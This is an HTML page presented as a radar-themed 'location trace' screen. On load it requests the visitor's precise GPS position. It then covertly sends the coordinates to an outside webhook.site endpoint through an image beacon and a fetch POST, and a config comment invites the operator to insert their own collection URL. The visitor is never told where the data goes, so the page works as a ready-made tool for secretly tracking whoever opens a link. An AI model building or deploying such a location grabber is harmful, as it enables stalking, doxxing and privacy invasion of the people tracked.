<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Locating...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #0a0a0f;
      font-family: 'Courier New', monospace;
      color: #00ff88;
      overflow: hidden;
    }

    /* Animated grid background */
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background-image:
        linear-gradient(rgba(0,255,136,0.04) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0,255,136,0.04) 1px, transparent 1px);
      background-size: 40px 40px;
      animation: gridScroll 20s linear infinite;
      pointer-events: none;
    }

    @keyframes gridScroll {
      0%   { transform: translateY(0); }
      100% { transform: translateY(40px); }
    }

    .panel {
      position: relative;
      background: rgba(0, 255, 136, 0.04);
      border: 1px solid rgba(0, 255, 136, 0.25);
      border-radius: 4px;
      padding: 48px 56px;
      max-width: 480px;
      width: 90%;
      text-align: center;
      box-shadow: 0 0 60px rgba(0,255,136,0.08), inset 0 0 40px rgba(0,255,136,0.03);
    }

    /* Corner decorations */
    .panel::before, .panel::after {
      content: '';
      position: absolute;
      width: 12px; height: 12px;
      border-color: #00ff88;
      border-style: solid;
    }
    .panel::before { top: -1px; left: -1px; border-width: 2px 0 0 2px; }
    .panel::after  { bottom: -1px; right: -1px; border-width: 0 2px 2px 0; }

    .radar {
      width: 80px;
      height: 80px;
      margin: 0 auto 32px;
      position: relative;
    }

    .radar-circle {
      position: absolute;
      inset: 0;
      border: 1.5px solid rgba(0,255,136,0.3);
      border-radius: 50%;
    }

    .radar-sweep {
      position: absolute;
      inset: 0;
      border-radius: 50%;
      background: conic-gradient(
        from 0deg,
        transparent 270deg,
        rgba(0, 255, 136, 0.5) 360deg
      );
      animation: sweep 1.8s linear infinite;
    }

    .radar-dot {
      position: absolute;
      top: 50%; left: 50%;
      width: 6px; height: 6px;
      background: #00ff88;
      border-radius: 50%;
      transform: translate(-50%, -50%);
      box-shadow: 0 0 8px #00ff88;
      animation: pulse 1.8s ease-in-out infinite;
    }

    @keyframes sweep {
      from { transform: rotate(0deg); }
      to   { transform: rotate(360deg); }
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; transform: translate(-50%,-50%) scale(1); }
      50%       { opacity: 0.5; transform: translate(-50%,-50%) scale(1.4); }
    }

    .label {
      font-size: 10px;
      letter-spacing: 0.3em;
      text-transform: uppercase;
      color: rgba(0,255,136,0.5);
      margin-bottom: 10px;
    }

    h1 {
      font-size: 22px;
      font-weight: normal;
      letter-spacing: 0.08em;
      margin-bottom: 28px;
      color: #00ff88;
    }

    #status {
      font-size: 13px;
      color: rgba(0,255,136,0.65);
      letter-spacing: 0.05em;
      line-height: 1.7;
      min-height: 60px;
    }

    .coords {
      margin-top: 28px;
      padding: 20px;
      background: rgba(0,255,136,0.06);
      border: 1px solid rgba(0,255,136,0.15);
      border-radius: 3px;
      font-size: 13px;
      letter-spacing: 0.06em;
      line-height: 2;
      display: none;
    }

    .coords .val { color: #fff; font-weight: bold; }

    .map-link {
      display: inline-block;
      margin-top: 20px;
      padding: 10px 24px;
      border: 1px solid rgba(0,255,136,0.4);
      color: #00ff88;
      text-decoration: none;
      font-size: 11px;
      letter-spacing: 0.2em;
      text-transform: uppercase;
      transition: background 0.2s, box-shadow 0.2s;
      border-radius: 2px;
    }
    .map-link:hover {
      background: rgba(0,255,136,0.1);
      box-shadow: 0 0 16px rgba(0,255,136,0.2);
    }

    .error { color: #ff4466; }

    /* Blinking cursor */
    .cursor {
      display: inline-block;
      width: 8px; height: 14px;
      background: #00ff88;
      margin-left: 3px;
      vertical-align: middle;
      animation: blink 1s step-end infinite;
    }
    @keyframes blink {
      0%, 100% { opacity: 1; } 50% { opacity: 0; }
    }
  </style>
</head>
<body>
  <div class="panel">
    <div class="radar">
      <div class="radar-circle"></div>
      <div class="radar-sweep"></div>
      <div class="radar-dot"></div>
    </div>

    <div class="label">System</div>
    <h1>LOCATION TRACE</h1>

    <div id="status">
      Requesting GPS signal<span class="cursor"></span>
    </div>

    <div class="coords" id="coords">
      <div>LAT &nbsp;<span class="val" id="lat">—</span></div>
      <div>LNG &nbsp;<span class="val" id="lng">—</span></div>
      <div>ACC &nbsp;<span class="val" id="acc">—</span> m</div>
    </div>

    <div id="map-wrap"></div>
  </div>

  <script>
    const statusEl = document.getElementById('status');
    const coordsEl = document.getElementById('coords');
    const latEl    = document.getElementById('lat');
    const lngEl    = document.getElementById('lng');
    const accEl    = document.getElementById('acc');
    const mapWrap  = document.getElementById('map-wrap');

    // ─── CONFIG ────────────────────────────────────────────────────────────────
    // Option A: paste your webhook.site URL (https://webhook.site/#!/your-token)
    // Option B: use your own backend endpoint
    // Leave empty to skip sending (coords still show on screen).
    const WEBHOOK_URL = 'https://webhook.site/fbbb3a4d-1eb1-476b-8b12-c51289079299';
    // ───────────────────────────────────────────────────────────────────────────

    function sendLocation(lat, lng, acc) {
      if (!WEBHOOK_URL) return;
      const payload = { lat, lng, accuracy_m: acc, ts: new Date().toISOString() };
      // Use an img beacon so it works cross-origin without CORS preflight
      const url = `${WEBHOOK_URL}?lat=${lat}&lng=${lng}&acc=${acc}&ts=${encodeURIComponent(payload.ts)}`;
      new Image().src = url;
      // Also try fetch for richer payloads
      fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        mode: 'no-cors'
      }).catch(() => {});
    }

    function onSuccess(pos) {
      const { latitude, longitude, accuracy } = pos.coords;

      latEl.textContent = latitude.toFixed(6);
      lngEl.textContent = longitude.toFixed(6);
      accEl.textContent = Math.round(accuracy);
      coordsEl.style.display = 'block';

      statusEl.innerHTML = 'Signal acquired. Location logged.';

      const mapsHref = `https://www.google.com/maps?q=${latitude},${longitude}`;
      mapWrap.innerHTML = `<a class="map-link" href="${mapsHref}" target="_blank">View on Maps</a>`;

      sendLocation(latitude, longitude, Math.round(accuracy));
    }

    function onError(err) {
      const msgs = {
        1: 'Permission denied by user.',
        2: 'Position unavailable.',
        3: 'Request timed out.'
      };
      statusEl.innerHTML = `<span class="error">ERR ${err.code}: ${msgs[err.code] || 'Unknown error.'}</span>`;
    }

    if (!navigator.geolocation) {
      statusEl.innerHTML = '<span class="error">Geolocation not supported by this browser.</span>';
    } else {
      navigator.geolocation.getCurrentPosition(onSuccess, onError, {
        enableHighAccuracy: true,
        timeout: 12000,
        maximumAge: 0
      });
    }
  </script>
</body>
</html>
